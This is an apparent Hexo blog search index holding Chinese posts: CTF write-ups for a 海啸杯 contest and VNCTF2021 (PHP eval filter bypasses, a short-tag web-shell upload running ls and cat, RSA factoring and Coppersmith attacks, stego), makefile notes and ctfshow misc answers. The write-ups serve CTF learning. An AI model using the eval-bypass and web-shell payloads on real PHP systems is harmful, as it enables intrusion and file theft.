{"meta":{"title":"潜心","subtitle":"","description":"","author":"flag2020","url":"https://flag2020.top","root":"/"},"pages":[{"title":"404","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-09T15:44:42.856Z","comments":true,"path":"404.html","permalink":"https://flag2020.top/404.html","excerpt":"","text":""},{"title":"friends","date":"2021-04-03T15:45:25.678Z","updated":"2021-04-03T15:45:25.678Z","comments":true,"path":"friends/index.html","permalink":"https://flag2020.top/friends/index.html","excerpt":"","text":""},{"title":"about","date":"2020-11-27T17:41:26.652Z","updated":"2020-11-27T17:41:11.292Z","comments":true,"path":"about/index.html","permalink":"https://flag2020.top/about/index.html","excerpt":"","text":"关于 本博客主题来自 https://shen-yu.gitee.io/ 一个安静且优雅的 Hexo 主题 GitHub：https://github.com/Shen-Yu/hexo-theme-ayer 公示板句子(如下)来自 Hitokoto - 一言 挂友链请点：friends | (flag2020.top)"},{"title":"categories","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-09T04:38:25.629Z","comments":true,"path":"categories/index.html","permalink":"https://flag2020.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-11-11T16:48:42.729Z","updated":"2020-11-11T16:48:14.888Z","comments":true,"path":"tags/index.html","permalink":"https://flag2020.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"第四届海啸杯 writeup","slug":"第四届海啸杯 writeup","date":"2021-04-05T16:00:00.000Z","updated":"2021-04-09T14:24:40.157Z","comments":true,"path":"posts/20210406.html","link":"20210406","permalink":"https://flag2020.top/posts/20210406.html","excerpt":"web &amp; misc &amp; crypto","text":"web &amp; misc &amp; crypto webWeb1&lt;?php highlight_file(__FILE__); $username = str_shuffle(md5(\"admin\")); $password = str_shuffle(md5(\"root\")); $login = false; if (isset($_GET['str'])) &#123; $str = $_GET['str']; $unserialize_str = unserialize($str); if ($unserialize_str['username'] == $username &amp;&amp; $unserialize_str['password'] == $password) &#123; $login = true; &#125; &#125; if ($login &amp;&amp; isset($_GET['code'])) &#123; if (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) &#123; if (!preg_match('/highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode/i', $_GET['code'])) &#123; eval($_GET['code']); &#125; else &#123; echo \"含有危险函数\" . \"&lt;br/>\"; &#125; &#125; else &#123; echo \"不符合正则表达式\" . \"&lt;br/>\"; &#125; &#125; 题目可分为两部分，一是通过if语句判断使$login的值变为true，二是通过eval函数执行我们想要的代码拿到flag $unserialize_str = unserialize($str); if ($unserialize_str['username'] == $username &amp;&amp; $unserialize_str['password'] == $password) &#123; $login = true; &#125; 虽然我们不知道$usernam和$password的值，但可以在if语句中使用的判断为== 由于php是弱类型语言，所以bool值为true的变量和任何变量比较都相等，除了0和false，因为0认为是bool false 由此构造$str &lt;?php $a = array( \"username\" => true, \"password\" => true ); echo serialize($a); a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125; 这样便能使$login被赋值为true 接下来要执行eval函数，需要通过两个if语句 /[^\\W]+\\((?R)?\\)/要匹配无参数的函数，函数内部可以无限嵌套相同的模式，也就是说只匹配字符串+()的类型，并且括号内为空字符串或字符串+() 不能使用highlight_file|localeconv|pos|curret|chdir|localtime|time|session|getallheaders|system|array|implode这些危险函数，包括大小写 scandir()函数返回指定目录中的文件和目录的数组，所以scandir(&#39;.&#39;)会返回当前文件所在文件夹的目录 var_dump(scandir(‘.’)); 但这样无法通过正则表达式，需要讲scandir内部替换为/[^\\W]+\\((?R)?\\)/ chr()函数会返回指定的 ASCII 值对应的字符，而.对应的ASCII值为46 由此构造出：var_dump(scandir(chr(46))); 现在只需要想办法讲构造出一个返回值为46的嵌套函数即可。 查看php版本 ?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;phpinfo(); 版本号为：7.2.24 phpversion()返回7.2.24-0ubuntu0.18.04.7 floor(phpversion())返回7 sin(floor(phpversion()))返回0.65698659871879 sin(sin(floor(phpversion())))返回0.61073350824527 cos(sin(sin(floor(phpversion()))))返回0.81922759437835 rad2deg(cos(sin(sin(floor(phpversion())))))返回46.938283618535 floor(rad2deg(cos(sin(sin(floor(phpversion()))))))返回46 这样便构造出46了 ?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;var_dump(scandir(chr(floor(rad2deg(cos(sin(sin(floor(phpversion()))))))))); 返回 array(5) &#123; [0]&#x3D;&gt; string(1) &quot;.&quot; [1]&#x3D;&gt; string(2) &quot;..&quot; [2]&#x3D;&gt; string(9) &quot;.DS_Store&quot; [3]&#x3D;&gt; string(9) &quot;index.php&quot; [4]&#x3D;&gt; string(16) &quot;this_is_flag.php&quot; &#125; flag在this_is_flag.php中，刚好在最后一个文件，通过end()读取最后一个文件，再通过show_source()打印，这样就得到最终的payload： ?str&#x3D;a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;&amp;code&#x3D;show_source(end(scandir(chr(floor(rad2deg(cos(sin(sin(floor(phpversion())))))))))); 附： php 5.x ?code&#x3D;var_dump(scandir(chr(floor(rad2deg(sin(cos(cos(floor(phpversion()))))))))); ?code&#x3D;show_source(end(scandir(chr(floor(rad2deg(sin(cos(cos(floor(phpversion())))))))))); WEB2&lt;?php error_reporting(0); highlight_file(__FILE__); function check($input)&#123; if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i\",$input))&#123; // if(preg_match(\"/'| |_|=|php/\",$input))&#123; die('hacker!!!'); &#125;else&#123; return $input; &#125; &#125; function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=>$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125; &#125; $dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/'; if(!file_exists($dir))&#123; mkdir($dir); &#125; switch($_GET[\"action\"] ?? \"\") &#123; case 'pwd': echo $dir; break; case 'upload': $data = $_GET[\"data\"] ?? \"\"; waf($data); file_put_contents(\"$dir\" . \"index.php\", $data); &#125; ?> 先查看下file_put_contents()要写入的文件的位置 &#x2F;?action&#x3D;pwd 得到： sandbox&#x2F;d65ad202e966d8bef3d5042ce9e0b877&#x2F; 过滤了php，用短标签绕过，过滤了空格，用%09代替 &#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;ls%09&#x2F;&#96;?&gt; 访问http://xxx/sandbox/d65ad202e966d8bef3d5042ce9e0b877/，得到 bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var xxxaf14gss.php 读取xxxafl4gss.php &#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?&#x3D;&#96;cat%09&#x2F;xxxaf14gss.*&#96;?&gt; 再次访问http://xxx/sandbox/d65ad202e966d8bef3d5042ce9e0b877/即可拿到flag misc隐藏的书用WinRAR打开隐藏的书.zip，可以看到： PDF的CRC32校验码为：3EAABDDE 压缩后的大小为：366699字节，转为十六进制为0005986B 用010editor打开隐藏的书.zip，修改对应的值，便可以解压压缩包拿到PDF文件 从PDF中可以知道flag.txt为flag通过某种编码的结果 从流程图可知：该内容不存在隐藏信息 所以，Hello.之后的内容为十六进制的ASCII码，转为对应的字符即可得到flag 你能看到图片里的flag吗用Stegsolve打开key.gif查看详细信息，发现不是每一帧的时间都相同，时间间隔不是20就是30，考虑gif时间隐写 用kali自带的工具提取时间间隔 identify -format &quot;%T&quot; key.gif 得到： 20303020303020302030302020302020202030302030203020302030303030302030302030202020203030202030203020303030202030202030302020302030 将20替换为0，30替换为1 &lt;?php $a = \"20303020303020302030302020302020202030302030203020302030303030302030302030202020203030202030203020303030202030202030302020302030\"; $a = str_replace('20', '0', $a); $a = str_replace('30', '1', $a); echo $a; 得到： 0110110101100100001101010101111101101000011001010111001001100101 通过网站在线转换二进制到字符串：http://www.txttool.com/wenben_binarystr.asp，得到： md5_here md5加密后得到： 623a3f3d828099e440475ce285c341ac 即为hint.rar的密码 解压之后得到两个文件 hint.txt 使用邻近法放缩图片 图片的宽度和高度在width_height.txt width_height.txt 显然width_height.txt是一组坐标的集合，通过python将这些坐标输出到图片上 from PIL import Image img = Image.new('RGB', (200, 200), (0, 0, 0)) f = open('width_height.txt') for line in f.readlines(): point = line.split() img.putpixel((int(point[0]), int(point[1])), (255, 255, 255)) f.close() img.show() 会得到一张二维码 扫码得到： width:192 height:90 最后通过PS打开flag.png，按住Ctrl+alt+I调整图片大小 宽度：192，高度：90，使用近邻法放缩 flag flag&#123;Th1s_1s_4_h1dden_F14g&#125; 神秘的铃声用010editor打开flag.wav，发现后面有一大串字符串，保存为test.txt base64解码后发现PK头，保存为zip文件 &lt;?php $path = 'test.txt'; $fp = fopen($path, 'rb'); $content = fread($fp, filesize($path)); fclose($fp); $content = base64_decode($content); $filename = 'test.zip'; $zip_fp = fopen($filename, 'wb'); fwrite($zip_fp, $content); ?> zip文件需要密码，重新回到flag.wav文件，用Audacity打开频谱图 看了writeup才知道这是DTMF信号，对照表可以得到：D#*C9A16B 在线网站：http://dialabc.com/sound/detect/index.html 解压得到一个txt文件，看起来是坐标，用python输出到一张白背景图上，得到一张二维码，扫码即可得到flag from PIL import Image img = Image.new('RGB', (260, 260), (0, 0, 0)) f = open('flag.txt') for line in f.readlines(): point = line.split() img.putpixel((int(point[0]), int(point[1])), (255, 255, 255)) f.close() img.show() 神秘的网站用Wireshark打开，根据提示，发现HTTP包中有个很大的上传包，另存下来分析 用010editor打开，发现zip压缩包，重命名为flag.zip 解压后得到一个文件：flag，用010editor打开，发现文件尾为反过来的zip头 将内容反转并保存为zip文件，保存后的flag.zip需要密码 with open('flag','rb') as f: with open('flag.zip','wb') as g: g.write(f.read()[::-1]) 原先的压缩包解压后有一张图片：TENTE.png，用010editor打开，显示chunk[4]出错，找到该数据块，为IDAT数据块 根据提示：图片修复需要改某个chunk长度 查看该数据块的同时，发现明显没有chunk[5]的数据块符号，所以猜测是chunk[4]的长度被改小了，导致该数据库提前结束，所以TENTE.png图片下方是透明的 查了下可以知道IDAT数据块与其它IDAT数据块相连，在010editor搜索IDAT，发现有另一个IDAT在chunk[4]结束之后，据此计算chunk[4]的正确长度 23C43-1341-4-4-4&#x3D;228F6 其中 第一个4为IDAT的字节数：4个字节 第二个4为chunk[5]的长度，占4个字节 第二个4为chunk[4]的crc校验码，也是4个字节 由此图片修改正确，显示出下面透明的部分 677a6d7475 解压压缩包得到flag.wav 根据提示：音乐最后网易云识别 以及图片上的字：信条，用Audacity将flag.wav倒放 CTRL + A 全选，点击“效果” –&gt; “反向（时间）” 然后用网易云识别歌曲，在评论找到flag flag&#123;034d7bac-92b2-11eb-9310-00163e12fb24&#125; cryptoeasyRSA已知c、e、n1、n2，只要能够分解n1，就能够拿到flag 在题目中n1和n2共用一个大质数p，所以n1和n2的最大公因数即为p，这样就能分解n1了 import gmpy2 import libnum e = 65537 n1 = 19927995886914135335416406082647120895619334038709715664270614604151473749182691765161766917756826761209408429340053534661116540440455731883912107733536490306892185777306017692334819486621137392115368637822832208615896079869167332092773633150006570996052837028257313679389522817781164233607188350606757597836490056930318266077647703629309920052447748365274174530490094908252256551706625163193805930254664728936230312618043386165963458944225026036816776258340041222542638064896328642143272486093326421275373201421890802797828158807121957406664052135737278317985129996476960525575320786302386904366901933941877871977923 n2 = 18891582332322922179757256935338383228362622765536723954262749118724360227437890613511811834258619933112000032816774390665802252670355559592889246899049387975273869584023100438870426265843757686044290924963164327025399130980205072334359825236874676865799829315906270559180981769846264222745663893031262917781276708151305378259082579089031371101323253330053986819164120184785001094503410745573822883437760154804937523455385157947633996347870180978374764506128842545299334183115882288528664242409706229889871455032394406814666870814759869179655535890356720047754561351306758635949531548031922969386197250253432717160713 c = 13464724434881083014378360688491414344998156133411847847874051353940035862995104112542330206199732554180770508723141951625606376158124527681508374976085150535523169426812879850201999337951347258663163526945777620586135979743047015305904146804741356004618021619877806139998460893541631182931447449498967591502111403371136690476476964569301404706879044022446236796126968424261474149501366709514040581812492269780027443526915046387838380291031527967274048028552563236517463115042981801314702717397461735551656092225777678039402709019728332707310411968980746101194493745338399939010674127078293589259391068943187148009190 p = gmpy2.gcd(n1, n2) q = n1//p phi = (p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n1) print(libnum.n2s(int(m))) flag flag&#123;u5e_the_s4me_p&#125; 数学很重要需要分解n，得到p和q，才能拿到m，即flag 在题目中有：d = gmpy2.invert(e, p*(p-1)*(q-1)) 由此来推导模数n的分解： 至此可以分解n = p * p * q，进而求出m import gmpy2 import libnum n = 1404864792885309108733640159316826506894236287548379939152849016743435983442699747921846125787195996033503870282773818470039914142701705451809138397049630572740639249477647644261254708528772540978792294225346035639261591427432057453936860038832354440430427494151140007167188185298912810715582637875006928402468687609650245843893636726667943630230916699610263246417106899540475644300775129490776223094431047266427439282518682724978986466077711523145747674327332051810519026006226118101950866725315377926329640394039034742537816196415220996830129516878556074570587486143579684121551028517709279020939236578960627017120428642424734081608822839438555638805913188881032407815526804750217289667978469999465893012019987646121081067553285784264938579036090518539835310642939403312387248525506990916704179728785567091817175793341264114889237623098808526580508172221259938132204690459668424325728699548951520597516996306695162612026923 c = 1056621132858553337843799531931829780532909526893598349757065810082614861897005399538516022339385456921080981930134553531451997667616780694476473935635850906657287327947505250813121839115712839784961838878589687696392168999007259428943177170885096149257761111375426947276207008555385135699868532336069097451167698609146202623839343749042437332344304731408930972252319186875629139934202497457999728524999876011248799301721947182662277983045924969387711620125568428544081394563081888004751018879893766348092204921968270651820590342957624989796768741978229821705472159840676453778980085893882942690791813978120574188104366811115515943434915719899354094207665657376073518852691150218789684229024823845100939031274257318172046382806032216330957494501967155244691377918879968703887945579606252867891939345438276905409978552743142300094751510214632116779662364652019422074762160221347591144466572300812675526052926724548943468469723 hint = 101794688716785217887960897945591243956989900037427176767666512559791995985108215779421011313213384758689708929722203071477840953013038647100924911493828188106127504843466854689586463951519895573419515062134362771498167243657486890676780200214663789335950289873729808283135837361560831229580803000690276177751767706193356374011845264745277604824551554541736615017289493676579496259064630875246918064858049304827949231835533001170204905788972411679518681180136352305431808979840858420025675441100205234779010351872551760580862818923553046506121627173411616799109177911982734522304097798381596915860520993100826264630451736911320052426159472868988436162344618566093403661349180934448297588983261629039054368903969451215957019928944985865422734016492501757272819066148585342366043951355199543153844023840418108988483011676230567828688205989252493165991940377092334291423942549979314542332470846061006424871389380351025361150311 e = 0x10001 p = gmpy2.gcd((pow(e, e) * hint - 1) % n, n) q = n // pow(p, 2) phi = p*(p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(libnum.n2s(int(m))) flag flag&#123;Mathematics_is_very_important!&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://flag2020.top/tags/writeup/"}]},{"title":"学习笔记——makefile","slug":"学习笔记——makefile","date":"2021-03-22T16:00:00.000Z","updated":"2021-04-09T15:18:23.559Z","comments":true,"path":"posts/20210323.html","link":"20210323","permalink":"https://flag2020.top/posts/20210323.html","excerpt":"Linux makefile学习笔记","text":"Linux makefile学习笔记 先准备3个文件 print.h #include &lt;stdio.h> void printhello(); print.c #include \"print.h\" void printhello() &#123; printf(\"Hello, world\\n\"); &#125; main.c #include \"print.h\" int main(void) &#123; printhello(); return 0; &#125; makefile 规则： target...:prerequisites... command（命令行必须前面加一个“Tab”键） ... target就是一个目标文件，可以是Object File、可执行文件、一个标签（Label）等。 prerequisites就是要生成那个target所需要的文件或是目标，文件之间用空格隔开。 command就是make需要执行的任意Shell命令，命令行必须由“Tab”键开头。 这是一个文件的依赖关系，target这一个或多个的目标文件依赖于prerequisites中的文件，其生成规则定义在command中。 prerequisites中如果有一个以上的文件比target文件要新的话，command所定义的命令就会被执行。这就是Makefile的规则，也是最核心的内容。 makefile_1 makefile helloworld: main.o print.o gcc -o helloworld main.o print.o main.o: maic.c print.h gcc -c main.c print.o: print.c print.h gcc -c print.c clean: rm helloworld main.o print.o 在命令行输入make，然后执行生成的可执行文件helloworld，最后执行makefile的clean部分 makefile_2 makefile objects &#x3D; main.o print.o helloworld: $(objects) gcc -o helloworld $(objects) main.o: main.c print.h gcc -c main.c print.o: print.c print.h gcc -c print.c clean: rm helloworld $(objects) makefile_3 makefile objects &#x3D; main.o print.o helloworld: $(objects) gcc -o helloworld $(objects) $(objects): print.h main.o: main.c print.o: print.c clean: rm helloworld $(objects) 任务 factorial.c int factorial(int n) &#123; if (n &lt;= 1) return 1; else return factorial(n - 1) * n; &#125; main.c int factorial(int n); int main(int argc, char **argv) &#123; int n; if (argc &lt; 2) &#123; printf(\"Usage: %s n\\n\", argv[0]); return -1; &#125; else &#123; n = atoi(argv[1]); printf(\"Factorial of %d is %d.\\n\", n, factorial(n)); &#125; return 0; &#125; 在这里先了解下main函数的参数 main(int argc,char* argv[]) argc：参数个数 argv：参数列表 #include &lt;stdio.h> #include &lt;stdlib.h> int main(int argc, char **argv) &#123; int i; for (i = 0; i &lt; argc; i++) &#123; printf(\"argv[%d] = %s\\n\", i, argv[i]); &#125; return 0; &#125; 当我们在当前文件打开终端，执行命令 test.exe 123 abcd 终端输出： argv[0] &#x3D; test.exe argv[1] &#x3D; 123 argv[2] &#x3D; abcd atoi函数 头文件：#include &lt;stdlib.h&gt; atoi() 函数用来将字符串转换成整数(int)，其原型为： int atoi (const char * str); 【函数说明】atoi() 函数会扫描参数 str 字符串，跳过前面的空白字符（例如空格，tab缩进等，可以通过 isspace() 函数来检测），直到遇上数字或正负符号才开始做转换，而再遇到非数字或字符串结束时(&#39;\\0&#39;)才结束转换，并将结果返回。 编写程序factorial的makefile文件 makefile factorial: main.o factorial.o gcc -o factorial main.o factorial.o main.o: main.c gcc -c main.c factorial.o: factorial.c gcc -c factorial.c clean: rm factorial main.o factorial.o 没有相应函数的库文件 修改main.c和factorial.c main.c #include &lt;stdio.h> #include &lt;stdlib.h> int factorial(int n); int main(int argc, char **argv) &#123; int n; if (argc &lt; 2) &#123; printf(\"Usage: %s n\\n\", argv[0]); return -1; &#125; else &#123; n = atoi(argv[1]); printf(\"Factorial of %d is %d.\\n\", n, factorial(n)); &#125; return 0; &#125; factorial.c #include &lt;stdio.h> #include &lt;stdlib.h> int factorial(int n) &#123; if (n &lt;= 1) return 1; else return factorial(n - 1) * n; &#125; 再次运行 对makefile进行改进 makefile objects &#x3D; main.o factorial.o factorial: $(objects) gcc -o factorial $(objects) main.o: main.c factorial.o: factorial.c clean: rm factorial $(objects)","categories":[{"name":"Notes","slug":"Notes","permalink":"https://flag2020.top/categories/Notes/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://flag2020.top/tags/Linux/"}]},{"title":"VNCTF2021-crypto-whitegive","slug":"VNCTF2021-crypto-whitegive","date":"2021-03-20T16:00:00.000Z","updated":"2021-04-09T14:08:47.239Z","comments":true,"path":"posts/20210321.html","link":"20210321","permalink":"https://flag2020.top/posts/20210321.html","excerpt":"RSA套娃","text":"RSA套娃 题目VNCTF2021 - Crypto - whitegive.py from Crypto.Util.number import * from secret import url from gmpy2 import * m = bytes_to_long(url) p = getPrime(512) q = getPrime(512) n = p * q d = getPrime(256) e = inverse(d,(p-1)*(q-1)) c = pow(m,e,n) print(n) print(c) m = e p = getPrime(512) q = getPrime(512) n = p * p * q e = 0x10001 d = inverse(e,lcm(p,lcm(p-1,q-1))) c = pow(m,e,n) hint = pow(d,e,n) print(n) print(c) print(hint) ''' 97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441 86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261 1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959 952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747 788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684 ''' 官方writeup 分解n，求e给出了模数n和密文c，但对公钥中的e进行加密，所以需要通过后面的代码解出。 n &#x3D; p * p * q d &#x3D; inverse(e,lcm(p,lcm(p-1,q-1))) c &#x3D; pow(m,e,n) hint &#x3D; pow(d,e,n) 已知n、c、hint、e，求m 在官方writeup中，已知$$e * d = k * p * (p-1) * (q-1) + 1$$ $$(e * d)^e = [k * p * (p-1) * (q-1) + 1]^e$$ 等式右边通过二项式定理展开，除了1以外，其它各项提取公约数p，得到各项之和用K代替，得到： 二项式定理：$$(a+b)^n = \\sum_{r=0}^{n} C_n^r a^{n-r} b^{r}$$ $$(e * d)^e = K * p + 1$$ 两边同时对n取模：$$(e * d)^e % n = (K * p + 1) % n$$ $$(e^e * d^e) % n = (K * p + 1) % n$$ 由分配律，可得： 模运算的分配律$$(a*b)%m = (a%m * b%m)%m$$ $$(e^e % n * d^e % n) % n = (K * p + 1) % n$$ 将hint = pow(d, e, n)代入等式，并由同余定理的性质可得： (a%n * b * c) %n = (a * b * c) %n $$(e^e % n * hint) % n = (K * p + 1) % n$$ $$(e^e * hint) % n = (K * p + 1) % n$$ 由同余式的性质，可得： 若$$a+b \\equiv c \\pmod{m}$$则：$$a \\equiv c-b \\pmod{m}$$ $$(e^e * hint - 1) % n = (K * p) % n$$ 记 a = e^e^ * hint - 1，即a%n = (K*p)%n，则存在整数t，使得下式成立$$a + tn = Kp$$ $$\\frac{1}{K}*a + \\frac{t}{K}*n = p$$ 由Be’zout恒等式可得： 裴蜀恒等式： 若a、b是整数，且gcd(a, b) = d，那么对于任意的整数x、y，ax+by一定是d的倍数 $$p = gcd(a, n)$$ $$p = gcd((e^e * hint - 1) % n, n)$$ 至此可以分解n = p * p * q，进而求出m import gmpy2 n = 1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959 c = 952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747 hint = 788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684 e = 0x10001 p = gmpy2.gcd((pow(e, e) * hint - 1) % n, n) q = n // pow(p, 2) phi = p*(p-1)*(q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(m) 解出m，即e 93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973 求m，即urln &#x3D; p * q e &#x3D; inverse(d,(p-1)*(q-1)) c &#x3D; pow(m, e, n) 已知n、e、c，求m 分解n得到p和q import gmpy2 import libnum n = 97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441 e = 93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973 c = 86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261 p = 9835780326918921450384939520703159429090649871281768715641755269342480464725277168508799134918968507663862771426644391164052107916295577234408385997691449 q = 9944769506198904796464695419856773937832623651063656661008222627141038630020296252710349732675131398772544767619996320162662374684215220228566848451929609 phi = (p-1) * (q-1) d = gmpy2.invert(e, phi) m = pow(c, d, n) print(libnum.n2s(int(m))) https:&#x2F;&#x2F;dawn-whisper.lanzous.com&#x2F;iCAv0lod7yj-password:gzjq 访问链接：https://dawn-whisper.lanzous.com/iCAv0lod7yj 密码：gzjq 得到一个task.txt文件 解出flag task.txt # Wow, you got here! # This is the last task, trust me! from Crypto.Util.number import * from secret import flag,padding from gmpy2 import * m = bytes_to_long(flag) e = 7 p = getPrime(512) q = getPrime(512) n = p * q c1 = pow(m,e,n) c2 = pow(m+padding,e,n) print(n) print(c1) print(c2) ''' 143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511 74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761 9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214 ''' Coppersmith Shortpad Attack（短填充攻击），与强网杯2019 Copperstudy 的第5层类似，参考：https://blog.csdn.net/zippo1234/article/details/109409929 使用在线sage网站解出m：https://sagecell.sagemath.org/ def short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y> = PolynomialRing(Zmod(n)) PRx.&lt;xn> = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz> = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.5)[0] return diff def related_message_attack(c1, c2, diff, e, n): PRx.&lt;x> = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0] e = 7 n = 143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511 c1 = 74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761 c2 = 9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214 diff = short_pad_attack(c1, c2, e, n) m = related_message_attack(c1, c2, diff, e, n) print(m) 得到m： 10987990383581104782482187747540238894765883387310758020242583119235786727788961015913718141 import libnum m = 10987990383581104782482187747540238894765883387310758020242583119235786727788961015913718141 print(libnum.n2s(m)) 得到flag： VNCTF&#123;H4ppyNeWy34r!2021_V&amp;N_figHt1ng!&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://flag2020.top/categories/CTF/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://flag2020.top/tags/crypto/"}]},{"title":"ctfshow——misc","slug":"ctfshow——misc","date":"2021-02-21T16:00:00.000Z","updated":"2021-04-09T14:30:48.870Z","comments":true,"path":"posts/20210222.html","link":"20210222","permalink":"https://flag2020.top/posts/20210222.html","excerpt":"杂项签到 &amp; misc2~misc8","text":"杂项签到 &amp; misc2~misc8 misc4 &amp; misc7 待更新 杂项签到zip伪加密：压缩源文件数据区的全局加密为 00 00，且压缩源文件目录区的全局方式位标记 09 00 将09改为00，解压就可以得到flag misc2题目：偶然发现我竟然还有个软盘，勾起了我的回忆。 点击编辑虚拟机设置，点击添加按钮添加软盘驱动器，然后使用软盘映像文件，选择解压后的file文件。 再打开虚拟机即可看到flag misc3题目： 密文：zse4rfvsdf 6yjmko0 提示1：解密后两个字符,小写 提示2：看看自己下面 提交flag&#123;明文&#125; 看键盘画线得明文，所以flag为flag&#123;av&#125; misc4 misc5将图片放大即可看到flag misc6解压后得到 YZYPYUYAXOYWXXYZXWYBYSXAZSYRYCYWYYUUXQ&#x3D; 字母解密即可得到flag：https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu misc7 